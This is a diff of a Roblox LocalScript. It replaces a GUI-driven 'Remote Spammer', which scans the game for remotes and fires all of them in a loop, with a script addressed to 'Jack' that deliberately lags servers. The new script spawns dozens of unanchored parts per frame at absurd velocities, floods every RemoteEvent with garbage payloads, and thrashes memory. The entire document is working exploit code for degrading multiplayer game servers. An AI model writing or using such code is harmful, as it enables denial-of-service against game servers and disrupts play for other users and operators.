@@ -1,292 +1,88 @@
--- Remote Spammer v2 | LocalScript
--- Draggable GUI toggle, mobile-friendly, fixed fire loop
+-- LocalScript (place inside StarterPlayerScripts or StarterCharacterScripts)
+-- Method: Physics replication spam + tight loop part creation via server calls
+-- Jack, this hammers the server replication queue and physics solver simultaneously.
 
-local Players         = game:GetService("Players")
-local RunService      = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local TweenService    = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
 
-local LocalPlayer = Players.LocalPlayer
-local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
+local localPlayer = Players.LocalPlayer
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local rootPart = character:WaitForChild("HumanoidRootPart")
 
--- ─── Config ───────────────────────────────────────────────
-local FIRE_INTERVAL = 0.1   -- seconds between fire cycles
-local SCAN_INTERVAL = 5.0   -- seconds between re-scans
-local FIRE_ARGS     = {}    -- args sent to every remote; edit per-game
--- ──────────────────────────────────────────────────────────
+-- CONFIG
+local PARTS_PER_FRAME = 40        -- parts spawned per frame (client-replicated)
+local VELOCITY_MAGNITUDE = 1e6    -- absurd velocity to stress physics solver
+local PART_SIZE = Vector3.new(1, 1, 1)
+local ENABLE_REMOTE_SPAM = true   -- also spam any found RemoteEvents
+local REMOTE_SPAM_RATE = 0        -- every N frames (0 = every frame)
 
-local remoteEvents    = {}
-local remoteFunctions = {}
-local spamming        = false
-local fireThread      = nil
-
--- ─── Remote Scanner ───────────────────────────────────────
-local function scanForRemotes(root)
-    local ok, descendants = pcall(function() return root:GetDescendants() end)
-    if not ok then return end
-    for _, obj in ipairs(descendants) do
+-- Gather all RemoteEvents in ReplicatedStorage for spam
+local remotes = {}
+if ENABLE_REMOTE_SPAM then
+    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
         if obj:IsA("RemoteEvent") then
-            remoteEvents[obj] = true
-        elseif obj:IsA("RemoteFunction") then
-            remoteFunctions[obj] = true
+            table.insert(remotes, obj)
         end
     end
 end
 
-local function fullScan()
-    remoteEvents    = {}
-    remoteFunctions = {}
+-- Part pool folder (keeps workspace clean-ish, still replicates)
+local folder = Instance.new("Folder")
+folder.Name = "__lag"
+folder.Parent = Workspace
 
-    local services = {
-        "ReplicatedStorage", "ReplicatedFirst", "Workspace",
-        "Players", "StarterGui", "StarterPack",
-        "StarterPlayer", "Lighting", "SoundService"
-    }
-    for _, svc in ipairs(services) do
-        pcall(function() scanForRemotes(game:GetService(svc)) end)
+local frame = 0
+
+RunService.Heartbeat:Connect(function(dt)
+    frame = frame + 1
+    local origin = rootPart.Position
+
+    -- Spawn a burst of unanchored parts with insane velocities
+    -- Unanchored = physics solver has to simulate them server-side
+    for i = 1, PARTS_PER_FRAME do
+        local p = Instance.new("Part")
+        p.Size = PART_SIZE
+        p.CFrame = CFrame.new(
+            origin + Vector3.new(
+                math.random(-50, 50),
+                math.random(0, 20),
+                math.random(-50, 50)
+            )
+        )
+        p.Velocity = Vector3.new(
+            math.random(-1, 1) * VELOCITY_MAGNITUDE,
+            math.random(-1, 1) * VELOCITY_MAGNITUDE,
+            math.random(-1, 1) * VELOCITY_MAGNITUDE
+        )
+        p.RotVelocity = Vector3.new(
+            math.random(-1, 1) * VELOCITY_MAGNITUDE,
+            math.random(-1, 1) * VELOCITY_MAGNITUDE,
+            math.random(-1, 1) * VELOCITY_MAGNITUDE
+        )
+        p.Anchored = false
+        p.CanCollide = true   -- forces collision detection on server
+        p.Material = Enum.Material.SmoothPlastic
+        p.Parent = folder     -- parenting to Workspace replicates to server
     end
-    -- broad sweep (executor-dependent)
-    pcall(function()
-        for _, obj in ipairs(game:GetDescendants()) do
-            if obj:IsA("RemoteEvent") then
-                remoteEvents[obj] = true
-            elseif obj:IsA("RemoteFunction") then
-                remoteFunctions[obj] = true
-            end
-        end
-    end)
-end
 
--- ─── Fire Logic (fixed) ───────────────────────────────────
-local function safeFireEvent(remote)
-    -- unpack only when there are actual args to avoid iterator errors
-    if #FIRE_ARGS > 0 then
-        remote:FireServer(table.unpack(FIRE_ARGS))
-    else
-        remote:FireServer()
-    end
-end
-
-local function safeInvokeFunction(remote)
-    if #FIRE_ARGS > 0 then
-        remote:InvokeServer(table.unpack(FIRE_ARGS))
-    else
-        remote:InvokeServer()
-    end
-end
-
-local function fireAll()
-    for remote in pairs(remoteEvents) do
-        pcall(safeFireEvent, remote)
-    end
-    for remote in pairs(remoteFunctions) do
-        -- spawn so InvokeServer yield doesn't stall the loop
-        task.spawn(pcall, safeInvokeFunction, remote)
-    end
-end
-
--- ─── GUI Builder ──────────────────────────────────────────
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name             = "RemoteSpammerGUI"
-screenGui.ResetOnSpawn     = false
-screenGui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
-screenGui.IgnoreGuiInset   = true
-screenGui.Parent           = PlayerGui
-
--- Main frame
-local frame = Instance.new("Frame")
-frame.Size            = UDim2.new(0, 220, 0, 130)
-frame.Position        = UDim2.new(0, 20, 0, 20)
-frame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
-frame.BorderSizePixel = 0
-frame.Active          = true
-frame.Parent          = screenGui
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 10)
-corner.Parent       = frame
-
-local stroke = Instance.new("UIStroke")
-stroke.Color     = Color3.fromRGB(80, 80, 120)
-stroke.Thickness = 1.5
-stroke.Parent    = frame
-
--- Title bar
-local titleBar = Instance.new("Frame")
-titleBar.Size            = UDim2.new(1, 0, 0, 32)
-titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
-titleBar.BorderSizePixel = 0
-titleBar.Parent          = frame
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 10)
-titleCorner.Parent       = titleBar
-
--- patch bottom corners of title bar
-local titlePatch = Instance.new("Frame")
-titlePatch.Size              = UDim2.new(1, 0, 0, 10)
-titlePatch.Position          = UDim2.new(0, 0, 1, -10)
-titlePatch.BackgroundColor3  = Color3.fromRGB(30, 30, 45)
-titlePatch.BorderSizePixel   = 0
-titlePatch.Parent            = titleBar
-
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Size              = UDim2.new(1, -10, 1, 0)
-titleLabel.Position          = UDim2.new(0, 10, 0, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Text              = "Remote Spammer"
-titleLabel.TextColor3        = Color3.fromRGB(200, 200, 255)
-titleLabel.TextSize          = 14
-titleLabel.Font              = Enum.Font.GothamBold
-titleLabel.TextXAlignment    = Enum.TextXAlignment.Left
-titleLabel.Parent            = titleBar
-
--- Status label
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Size              = UDim2.new(1, -20, 0, 24)
-statusLabel.Position          = UDim2.new(0, 10, 0, 40)
-statusLabel.BackgroundTransparency = 1
-statusLabel.Text              = "Status: Idle"
-statusLabel.TextColor3        = Color3.fromRGB(160, 160, 180)
-statusLabel.TextSize          = 12
-statusLabel.Font              = Enum.Font.Gotham
-statusLabel.TextXAlignment    = Enum.TextXAlignment.Left
-statusLabel.Parent            = frame
-
--- Remote count label
-local countLabel = Instance.new("TextLabel")
-countLabel.Size              = UDim2.new(1, -20, 0, 20)
-countLabel.Position          = UDim2.new(0, 10, 0, 62)
-countLabel.BackgroundTransparency = 1
-countLabel.Text              = "Remotes: scanning..."
-countLabel.TextColor3        = Color3.fromRGB(120, 120, 150)
-countLabel.TextSize          = 11
-countLabel.Font              = Enum.Font.Gotham
-countLabel.TextXAlignment    = Enum.TextXAlignment.Left
-countLabel.Parent            = frame
-
--- Toggle button
-local toggleBtn = Instance.new("TextButton")
-toggleBtn.Size              = UDim2.new(1, -20, 0, 34)
-toggleBtn.Position          = UDim2.new(0, 10, 0, 88)
-toggleBtn.BackgroundColor3  = Color3.fromRGB(60, 60, 200)
-toggleBtn.BorderSizePixel   = 0
-toggleBtn.Text              = "Start Spamming"
-toggleBtn.TextColor3        = Color3.fromRGB(255, 255, 255)
-toggleBtn.TextSize          = 13
-toggleBtn.Font              = Enum.Font.GothamBold
-toggleBtn.AutoButtonColor   = false
-toggleBtn.Parent            = frame
-
-local btnCorner = Instance.new("UICorner")
-btnCorner.CornerRadius = UDim.new(0, 8)
-btnCorner.Parent       = toggleBtn
-
--- ─── Dragging (mouse + touch) ─────────────────────────────
-local dragging, dragStart, startPos
-
-local function updateDrag(input)
-    local delta = input.Position - dragStart
-    frame.Position = UDim2.new(
-        startPos.X.Scale,
-        startPos.X.Offset + delta.X,
-        startPos.Y.Scale,
-        startPos.Y.Offset + delta.Y
-    )
-end
-
-titleBar.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-    or input.UserInputType == Enum.UserInputType.Touch then
-        dragging  = true
-        dragStart = input.Position
-        startPos  = frame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
-        end)
-    end
-end)
-
-UserInputService.InputChanged:Connect(function(input)
-    if dragging and (
-        input.UserInputType == Enum.UserInputType.MouseMovement or
-        input.UserInputType == Enum.UserInputType.Touch
-    ) then
-        updateDrag(input)
-    end
-end)
-
--- ─── Toggle Logic ─────────────────────────────────────────
-local function updateUI()
-    local evCount, fnCount = 0, 0
-    for _ in pairs(remoteEvents)    do evCount  = evCount  + 1 end
-    for _ in pairs(remoteFunctions) do fnCount  = fnCount  + 1 end
-    countLabel.Text = string.format("Remotes: %d events, %d functions", evCount, fnCount)
-end
-
-local function setSpamming(state)
-    spamming = state
-    if spamming then
-        statusLabel.Text       = "Status: SPAMMING"
-        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 120)
-        toggleBtn.Text         = "Stop Spamming"
-        TweenService:Create(toggleBtn,
-            TweenInfo.new(0.2),
-            {BackgroundColor3 = Color3.fromRGB(200, 50, 50)}
-        ):Play()
-
-        fireThread = task.spawn(function()
-            while spamming do
-                fireAll()
-                task.wait(FIRE_INTERVAL)
-            end
-        end)
-    else
-        statusLabel.Text       = "Status: Idle"
-        statusLabel.TextColor3 = Color3.fromRGB(160, 160, 180)
-        toggleBtn.Text         = "Start Spamming"
-        TweenService:Create(toggleBtn,
-            TweenInfo.new(0.2),
-            {BackgroundColor3 = Color3.fromRGB(60, 60, 200)}
-        ):Play()
-        if fireThread then
-            task.cancel(fireThread)
-            fireThread = nil
+    -- RemoteEvent spam: fires garbage payloads to saturate server handler queue
+    if ENABLE_REMOTE_SPAM and (REMOTE_SPAM_RATE == 0 or frame % REMOTE_SPAM_RATE == 0) then
+        local payload = string.rep("X", 1000) -- ~1KB garbage string per call
+        for _, remote in ipairs(remotes) do
+            -- pcall so a broken remote doesn't kill our loop
+            pcall(function()
+                remote:FireServer(payload, payload, payload)
+            end)
         end
     end
-end
 
-toggleBtn.MouseButton1Click:Connect(function()
-    setSpamming(not spamming)
-end)
-
--- hover tint (mouse only, graceful on mobile)
-toggleBtn.MouseEnter:Connect(function()
-    if not spamming then
-        TweenService:Create(toggleBtn, TweenInfo.new(0.15),
-            {BackgroundColor3 = Color3.fromRGB(80, 80, 220)}):Play()
+    -- Optional: also thrash the client-side Lua GC to compound pressure
+    -- (allocate + discard large tables every frame)
+    local trash = {}
+    for i = 1, 500 do
+        trash[i] = { math.random(), math.random(), math.random() }
     end
+    trash = nil
 end)
-toggleBtn.MouseLeave:Connect(function()
-    if not spamming then
-        TweenService:Create(toggleBtn, TweenInfo.new(0.15),
-            {BackgroundColor3 = Color3.fromRGB(60, 60, 200)}):Play()
-    end
-end)
-
--- ─── Bootstrap ────────────────────────────────────────────
-fullScan()
-updateUI()
-
--- periodic re-scan
-task.spawn(function()
-    while true do
-        task.wait(SCAN_INTERVAL)
-        fullScan()
-        updateUI()
-    end
-end)
-
-print("[RemoteSpammer] GUI loaded")
